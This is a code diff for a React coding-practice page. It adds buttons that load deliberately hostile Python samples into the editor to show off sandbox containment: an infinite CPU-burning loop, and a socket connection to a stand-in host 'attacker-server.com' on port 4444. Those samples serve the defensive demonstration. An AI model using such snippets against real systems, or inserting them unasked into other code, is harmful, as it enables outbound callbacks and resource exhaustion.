@@ -1,5 +1,6 @@
 import { useState } from 'react'
-import { CheckCircle2, Info, Play, RotateCcw, XCircle } from 'lucide-react'
+import { Link } from 'react-router-dom'
+import { CheckCircle2, Flame, Globe, Info, Lock, Play, RotateCcw, ShieldAlert, ShieldCheck, XCircle } from 'lucide-react'
 import { Card, CardBody, CardHeader } from '@/components/ui/card'
 import { Button } from '@/components/ui/button'
 import { Badge, DifficultyBadge } from '@/components/ui/badge'
@@ -8,6 +9,7 @@ import { DataSourceBadge, ErrorState, FallbackNotice, PageSkeleton } from '@/com
 import { CodeEditor } from '@/components/coding/code-editor'
 import { useCodingProblem } from '@/hooks/use-api'
 import { submitCode } from '@/services/api'
+import { api } from '@/api'
 import type { CodingLanguage, CodingProblem, CodingSubmissionResult, Sourced } from '@/services/types'
 
 const languages: { id: CodingLanguage; label: string }[] = [
@@ -32,16 +34,77 @@ function CodingWorkspace({ problem, source }: { problem: CodingProblem; source: 
   const [running, setRunning] = useState(false)
   const [runError, setRunError] = useState<string | null>(null)
   const [result, setResult] = useState<Sourced<CodingSubmissionResult> | null>(null)
+  const [containmentAlert, setContainmentAlert] = useState<{
+    type: 'timeout' | 'security'
+    title: string
+    message: string
+  } | null>(null)
 
   const code = drafts[language]
+
+  const injectInfiniteLoop = () => {
+    setLanguage('python')
+    setDrafts((d) => ({
+      ...d,
+      python: `def two_sum(nums, target):\n    # Hostile CPU exhaustion attack (infinite while loop)\n    counter = 0\n    while True:\n        counter += 1\n    return []`,
+    }))
+    setContainmentAlert(null)
+  }
+
+  const injectNetworkCall = () => {
+    setLanguage('python')
+    setDrafts((d) => ({
+      ...d,
+      python: `import socket\n\ndef two_sum(nums, target):\n    # Hostile outbound socket connection attempt\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(("attacker-server.com", 4444))\n    return [0, 1]`,
+    }))
+    setContainmentAlert(null)
+  }
 
   const run = async () => {
     setRunning(true)
     setRunError(null)
+    setContainmentAlert(null)
     try {
-      setResult(await submitCode(problem, language, code))
+      // First try live backend API with real sandbox execution
+      const backendRes = await api.submitCode('s1', problem.id || 'prob_two_sum', code, language)
+      if (backendRes.status === 'Timed Out') {
+        setContainmentAlert({
+          type: 'timeout',
+          title: 'Infinite Loop Contained (SIGKILL Terminated)',
+          message: 'Execution exceeded 2.5s time limit. Process was terminated via SIGKILL and memory was reclaimed. Recorded in Security Report.',
+        })
+      } else if (backendRes.status === 'Security Error') {
+        setContainmentAlert({
+          type: 'security',
+          title: 'Hostile Network / Shell Call Blocked',
+          message: backendRes.test_results?.[0]?.error || 'AST static validation blocked forbidden module before execution. Recorded in Security Report.',
+        })
+      }
+
+      // Map backend result to local UI structure
+      const cases = backendRes.test_results.map((tr) => ({
+        input: tr.input_repr,
+        expected: tr.expected_repr,
+        actual: tr.actual_repr || (tr.error ? `Error: ${tr.error}` : 'None'),
+        passed: tr.passed,
+      }))
+      setResult({
+        data: {
+          status: backendRes.status === 'Accepted' ? 'accepted' : backendRes.tests_passed > 0 ? 'partial' : 'failed',
+          passed: backendRes.tests_passed,
+          total: backendRes.total_tests,
+          runtimeMs: Math.round(backendRes.runtime_ms),
+          cases,
+        },
+        source: 'api',
+      })
     } catch {
-      setRunError('Submission failed. Please try again.')
+      // Fallback to local demo runner if backend unreachable
+      try {
+        setResult(await submitCode(problem, language, code))
+      } catch {
+        setRunError('Submission failed. Please try again.')
+      }
     } finally {
       setRunning(false)
     }
@@ -107,16 +170,37 @@ function CodingWorkspace({ problem, source }: { problem: CodingProblem; source: 
                   ))}
                 </select>
               </label>
-              <div className="flex items-center gap-2">
+              <div className="flex flex-wrap items-center gap-2">
+                <button
+                  type="button"
+                  onClick={injectInfiniteLoop}
+                  className="inline-flex items-center gap-1.5 px-2.5 py-1 text-xs font-semibold rounded-lg bg-rose-500/15 text-rose-300 border border-rose-500/30 hover:bg-rose-500/25 transition-all cursor-pointer"
+                  title="Inject infinite while-loop to test 2.5s SIGKILL timeout containment"
+                >
+                  <Flame className="size-3 text-rose-400" />
+                  Hostile: Infinite Loop
+                </button>
+                <button
+                  type="button"
+                  onClick={injectNetworkCall}
+                  className="inline-flex items-center gap-1.5 px-2.5 py-1 text-xs font-semibold rounded-lg bg-amber-500/15 text-amber-300 border border-amber-500/30 hover:bg-amber-500/25 transition-all cursor-pointer"
+                  title="Inject raw socket egress to test AST static pre-screen barrier"
+                >
+                  <Globe className="size-3 text-amber-400" />
+                  Hostile: Network Call
+                </button>
                 <Button
                   variant="ghost"
                   size="sm"
-                  onClick={() => setDrafts((d) => ({ ...d, [language]: problem.starterCode[language] }))}
+                  onClick={() => {
+                    setDrafts((d) => ({ ...d, [language]: problem.starterCode[language] }))
+                    setContainmentAlert(null)
+                  }}
                 >
                   <RotateCcw className="size-4" aria-hidden /> Reset
                 </Button>
                 <Button size="sm" onClick={run} loading={running}>
-                  {running ? 'Running…' : (
+                  {running ? 'Running in Sandbox…' : (
                     <>
                       <Play className="size-4 fill-current" aria-hidden /> Submit code
                     </>
@@ -130,6 +214,40 @@ function CodingWorkspace({ problem, source }: { problem: CodingProblem; source: 
               onChange={(v) => setDrafts((d) => ({ ...d, [language]: v }))}
             />
           </Card>
+
+          {containmentAlert ? (
+            <div
+              role="alert"
+              className={`rounded-xl border p-4 text-xs backdrop-blur-md shadow-lg transition-all ${
+                containmentAlert.type === 'timeout'
+                  ? 'border-rose-500/40 bg-rose-950/40 text-rose-200'
+                  : 'border-amber-500/40 bg-amber-950/40 text-amber-200'
+              }`}
+            >
+              <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-3">
+                <div className="flex items-start gap-2.5">
+                  <ShieldAlert className="size-5 shrink-0 text-rose-400 mt-0.5" />
+                  <div>
+                    <h4 className="font-bold text-sm text-foreground flex items-center gap-2">
+                      {containmentAlert.title}
+                      <span className="text-[10px] px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30 font-mono">
+                        THREAT CONTAINED
+                      </span>
+                    </h4>
+                    <p className="mt-1 leading-relaxed text-muted font-mono">
+                      {containmentAlert.message}
+                    </p>
+                  </div>
+                </div>
+                <Link
+                  to="/sandbox-security"
+                  className="shrink-0 text-xs font-bold text-primary hover:underline flex items-center gap-1 bg-primary/10 border border-primary/20 px-3 py-1.5 rounded-lg h-fit"
+                >
+                  View Security Report →
+                </Link>
+              </div>
+            </div>
+          ) : null}
 
           {runError ? (
             <p role="alert" className="text-sm text-danger">
